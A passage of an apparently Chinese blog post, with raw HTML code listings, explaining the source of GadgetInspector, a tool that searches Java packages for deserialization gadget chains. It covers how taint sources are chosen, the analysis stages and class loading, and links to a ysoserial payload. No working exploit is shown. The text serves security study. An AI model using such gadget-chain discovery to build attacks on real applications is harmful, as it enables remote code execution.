class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleSourceDiscovery</span> <span class="keyword">extends</span> <span class="title class_">SourceDiscovery</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">discover</span><span class="params">(Map&lt;ClassReference.Handle, ClassReference&gt; classMap,</span></span><br><span class="line"><span class="params">                         Map&lt;MethodReference.Handle, MethodReference&gt; methodMap,</span></span><br><span class="line"><span class="params">                         InheritanceMap inheritanceMap)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化决策者，用于判断类是否可序列化</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">SerializableDecider</span> <span class="variable">serializableDecider</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleSerializableDecider</span>(inheritanceMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历方法</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="comment">// 判断所属类是否可序列化</span></span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123;</span><br><span class="line">                <span class="comment">// 如果是 finalize 方法则认为是受污染的</span></span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;finalize&quot;</span>) &amp;&amp; method.getDesc().equals(<span class="string">&quot;()V&quot;</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> <span class="title class_">Source</span>(method, <span class="number">0</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历方法，和上面的类似（可以合并）</span></span><br><span class="line">        <span class="comment">// If a class implements readObject, the ObjectInputStream passed in is considered tainted</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123;</span><br><span class="line">                <span class="comment">// 如果所属类实现了 readObject，则传入的 ObjectInputStream 参数被认为是受污染的</span></span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;readObject&quot;</span>) &amp;&amp; method.getDesc().equals(<span class="string">&quot;(Ljava/io/ObjectInputStream;)V&quot;</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> <span class="title class_">Source</span>(method, <span class="number">1</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历类</span></span><br><span class="line">        <span class="comment">// Using the proxy trick, anything extending serializable and invocation handler is tainted.</span></span><br><span class="line">        <span class="keyword">for</span> (ClassReference.Handle clazz : classMap.keySet()) &#123;</span><br><span class="line">            <span class="comment">// 判断类是否可序列化，且是否为 InvocationHandler 的子类</span></span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(clazz))</span><br><span class="line">                    &amp;&amp; inheritanceMap.isSubclassOf(clazz, <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(<span class="string">&quot;java/lang/reflect/InvocationHandler&quot;</span>))) &#123;</span><br><span class="line">                <span class="comment">// 使用代理时，任何扩展 InvocationHandler 的类都被认为受污染</span></span><br><span class="line">                MethodReference.<span class="type">Handle</span> <span class="variable">method</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodReference</span>.Handle(</span><br><span class="line">                        clazz, <span class="string">&quot;invoke&quot;</span>, <span class="string">&quot;(Ljava/lang/Object;Ljava/lang/reflect/Method;[Ljava/lang/Object;)Ljava/lang/Object;&quot;</span>);</span><br><span class="line"></span><br><span class="line">                addDiscoveredSource(<span class="keyword">new</span> <span class="title class_">Source</span>(method, <span class="number">0</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历方法，和上面的类似（可以合并）</span></span><br><span class="line">        <span class="comment">// hashCode() or equals() are accessible entry points using standard tricks of putting those objects</span></span><br><span class="line">        <span class="comment">// into a HashMap.</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123;</span><br><span class="line">                <span class="comment">// 如果是 hashCode 方法则认为是受污染的（注意描述符）</span></span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;hashCode&quot;</span>) &amp;&amp; method.getDesc().equals(<span class="string">&quot;()I&quot;</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> <span class="title class_">Source</span>(method, <span class="number">0</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 如果是 equals 方法则认为是受污染的（注意描述符）</span></span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; method.getDesc().equals(<span class="string">&quot;(Ljava/lang/Object;)Z&quot;</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> <span class="title class_">Source</span>(method, <span class="number">0</span>));</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> <span class="title class_">Source</span>(method, <span class="number">1</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历方法，和上面的类似（可以合并）</span></span><br><span class="line">        <span class="comment">// Using a comparator proxy, we can jump into the call() / doCall() method of any groovy Closure and all the</span></span><br><span class="line">        <span class="comment">// args are tainted.</span></span><br><span class="line">        <span class="comment">// https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/Groovy1.java</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="comment">// 使用比较器代理，可以跳转到任何 groovy Closure 的 call()/doCall() 方法，所有的参数都被污染</span></span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))</span><br><span class="line">                    &amp;&amp; inheritanceMap.isSubclassOf(method.getClassReference(), <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(<span class="string">&quot;groovy/lang/Closure&quot;</span>))</span><br><span class="line">                    &amp;&amp; (method.getName().equals(<span class="string">&quot;call&quot;</span>) || method.getName().equals(<span class="string">&quot;doCall&quot;</span>))) &#123;</span><br><span class="line"></span><br><span class="line">                addDiscoveredSource(<span class="keyword">new</span> <span class="title class_">Source</span>(method, <span class="number">0</span>));</span><br><span class="line">                Type[] methodArgs = Type.getArgumentTypes(method.getDesc());</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; methodArgs.length; i++) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> <span class="title class_">Source</span>(method, i + <span class="number">1</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">SourceDiscovery</span> <span class="variable">sourceDiscovery</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleSourceDiscovery</span>();</span><br><span class="line">        sourceDiscovery.discover();</span><br><span class="line">        sourceDiscovery.save();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x03-工作流程"><a href="#0x03-工作流程" class="headerlink" title="0x03 工作流程"></a>0x03 工作流程</h1><ol><li>准备工作<ul><li>配置 log4j 向控制台输出日志</li><li>配置 config 为默认值 jserial（Java 反序列化）</li><li>接受参数：<code>--resume</code> 保留 .dat 文件、<code>--config</code> 指定分析类型</li><li>根据参数读取 war&#x2F;jar 包路径，返回 URLClassLoader</li><li>初始化类枚举加载器 ClassResourceEnumerator</li></ul></li><li>MethodDiscovery：类信息、方法信息、继承信息<ul><li>classes.dat：类名、父类名、类接口名、是否为接口、类的所有字段（成员）</li><li>methods.dat：类名、方法名、描述符、是否为静态方法</li><li>inheritanceMap.dat：类名、父类&#x2F;超类&#x2F;接口类（直接&#x2F;间接父类）</li></ul></li><li>PassthroughDiscovery：数据流信息，即方法参数是否能够影响其返回值<ul><li>如果存在方法将参数传递给被调方法时，需要先判断被调方法返回值与被调方法参数的关系。</li><li>passthrough.dat：类名、方法名、方法描述符、污点参数索引</li></ul></li><li>CallGraphDiscovery：方法调用关系信息<ul><li>callgraph.dat：方法所属类名，方法名，方法描述符，被调方法所属类名，被调方法名，被调方法描述，方法参数索引，方法参数对象的字段名称，被调方法参数索引</li></ul></li><li>SourceDiscovery：查找污点源<ul><li>sources.dat：类名，方法名，描述符，参数索引</li></ul></li><li>GadgetChainDiscovery：重写信息、利用链信息<ul><li>methodimpl.dat：类名，方法名，描述符</li><li>gadget-chains.txt：类名.方法名描述符 (参数索引)</li></ul></li></ol><h2 id="1-Util"><a href="#1-Util" class="headerlink" title="1. Util"></a>1. Util</h2><p>根据 java 包路径列表返回 URLClassLoader，后续用于读取相应的 java 包（war、jar）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Util</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">LOGGER</span> <span class="operator">=</span> LoggerFactory.getLogger(Util.class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据 war 包路径列表，构造并返回 URLClassLoader</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> warPath 包路径列表</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ClassLoader <span class="title function_">getWarClassLoader</span><span class="params">(Path warPath)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 创建临时文件夹</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Path</span> <span class="variable">tmpDir</span> <span class="operator">=</span> Files.createTempDirectory(<span class="string">&quot;exploded-war&quot;</span>);</span><br><span class="line">        <span class="comment">// Delete the temp directory at shutdown</span></span><br><span class="line">        Runtime.getRuntime().addShutdownHook(<span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                deleteDirectory(tmpDir);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                LOGGER.error(<span class="string">&quot;Error cleaning up temp directory &quot;</span> + tmpDir.toString(), e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 复制到临时文件夹</span></span><br><span class="line">        <span class="comment">// Extract to war to the temp directory</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">JarInputStream</span> <span class="variable">jarInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JarInputStream</span>(Files.newInputStream(warPath))) &#123;</span><br><span class="line">            JarEntry jarEntry;</span><br><span class="line">            <span class="keyword">while</span> ((jarEntry = jarInputStream.getNextJarEntry()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">Path</span> <span class="variable">fullPath</span> <span class="operator">=</span> tmpDir.resolve(jarEntry.getName());</span><br><span class="line">                <span class="keyword">if</span> (!jarEntry.isDirectory()) &#123;</span><br><span class="line">                    <span class="type">Path</span> <span class="variable">dirName</span> <span class="operator">=</span> fullPath.getParent();</span><br><span class="line">                    <span class="keyword">if</span> (dirName == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Parent of item is outside temp directory.&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (!Files.exists(dirName)) &#123;</span><br><span class="line">                        Files.createDirectories(dirName);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">try</span> (<span class="type">OutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> Files.newOutputStream(fullPath)) &#123;</span><br><span class="line">                        copy(jarInputStream, outputStream);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 存储包路径</span></span><br><span class="line">        <span class="keyword">final</span> List&lt;URL&gt; classPathUrls = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        classPathUrls.add(tmpDir.resolve(<span class="string">&quot;WEB-INF/classes&quot;</span>).toUri().toURL());</span><br><span class="line">        Files.list(tmpDir.resolve(<span class="string">&quot;WEB-INF/lib&quot;</span>)).forEach(p -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                classPathUrls.add(p.toUri().toURL());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (MalformedURLException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(classPathUrls.toArray(<span class="keyword">new</span> <span class="title class_">URL</span>[classPathUrls.size()]));</span><br><span class="line">        <span class="keyword">return</span> classLoader;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据 jar 包路径列表，构造并返回 URLClassLoader</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> jarPaths 包路径列表</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ClassLoader <span class="title function_">getJarClassLoader</span><span class="params">(Path... jarPaths)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 存储包路径</span></span><br><span class="line">        <span class="keyword">final</span> List&lt;URL&gt; classPathUrls = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(jarPaths.length);</span><br><span class="line">        <span class="comment">// 遍历包路径列表</span></span><br><span class="line">        <span class="keyword">for</span> (Path jarPath : jarPaths) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!Files.exists(jarPath) || Files.isDirectory(jarPath)) &#123; <span class="comment">// 查找文件</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Path \&quot;&quot;</span> + jarPath + <span class="string">&quot;\&quot; is not a path to a file.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            classPathUrls.add(jarPath.toUri().toURL()); <span class="comment">//</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(classPathUrls.toArray(<span class="keyword">new</span> <span class="title class_">URL</span>[classPathUrls.size()]));</span><br><span class="line">        <span class="keyword">return</span> classLoader;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Recursively delete the directory root and all its contents</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> root Root directory to be deleted</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deleteDirectory</span><span class="params">(Path root)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Files.walkFileTree(root, <span class="keyword">new</span> <span class="title class_">SimpleFileVisitor</span>&lt;Path&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> FileVisitResult <span class="title function_">visitFile</span><span class="params">(Path file, BasicFileAttributes attrs)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                Files.delete(file);</span><br><span class="line">                <span class="keyword">return</span> FileVisitResult.CONTINUE;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> FileVisitResult <span class="title function_">postVisitDirectory</span><span class="params">(Path dir, IOException exc)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                Files.delete(dir);</span><br><span class="line">                <span class="keyword">return</span> FileVisitResult.CONTINUE;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Copy inputStream to outputStream. Neither stream is closed by this method.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> inputStream</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> outputStream</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">copy</span><span class="params">(InputStream inputStream, OutputStream outputStream)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4096</span>];</span><br><span class="line">        <span class="type">int</span> n;</span><br><span class="line">        <span class="keyword">while</span> ((n = inputStream.read(buffer)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            outputStream.write(buffer, <span class="number">0</span>, n);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-ClassResourceEnumerator"><a href="#2-ClassResourceEnumerator" class="headerlink" title="2. ClassResourceEnumerator"></a>2. ClassResourceEnumerator</h2><p>定义类资源接口。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">interface</span> <span class="title class_">ClassResource</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> InputStream <span class="title function_">getInputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException; <span class="comment">// 读取文件</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>;    <span class="comment">// 文件名</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>类资源具体实现：</p><ul><li><code>PathClassResource</code>：直接从路径读取类文件，用于通过 JRT 文件系统读取路径下的类文件（运行时）</li><li><code>ClassLoaderClassResource</code>：使用已有的 ClassLoader 读取类文件</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从路径读取类文件</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">PathClassResource</span> <span class="keyword">implements</span> <span class="title class_">ClassResource</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Path path;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">PathClassResource</span><span class="params">(Path path)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.path = path;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> InputStream <span class="title function_">getInputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">return</span> Files.newInputStream(path);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> path.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 ClassLoader 读取类文件</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ClassLoaderClassResource</span> <span class="keyword">implements</span> <span class="title class_">ClassResource</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ClassLoader classLoader;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String resourceName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">ClassLoaderClassResource</span><span class="params">(ClassLoader classLoader, String resourceName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.classLoader = classLoader;</span><br><span class="line">        <span class="built_in">this</span>.resourceName = resourceName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> InputStream <span class="title function_">getInputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">return</span> classLoader.getResourceAsStream(resourceName);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> resourceName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回运行时的所有类和指定 java 包中的类，这里的运行时类指 JDK 中的类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 返回 java 运行时的类和指定的 java 包中的类</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Collection&lt;ClassResource&gt; <span class="title function_">getAllClasses</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 先加载运行时类（bootstrap classes）</span></span><br><span class="line">    Collection&lt;ClassResource&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(getRuntimeClasses());</span><br><span class="line">    <span class="comment">// 使用 ClassLoader 加载用户指定的 java 包</span></span><br><span class="line">    <span class="keyword">for</span> (ClassPath.ClassInfo classInfo : ClassPath.from(classLoader).getAllClasses()) &#123;</span><br><span class="line">        result.add(<span class="keyword">new</span> <span class="title class_">ClassLoaderClassResource</span>(classLoader, classInfo.getResourceName()));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 返回运行时的类</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> 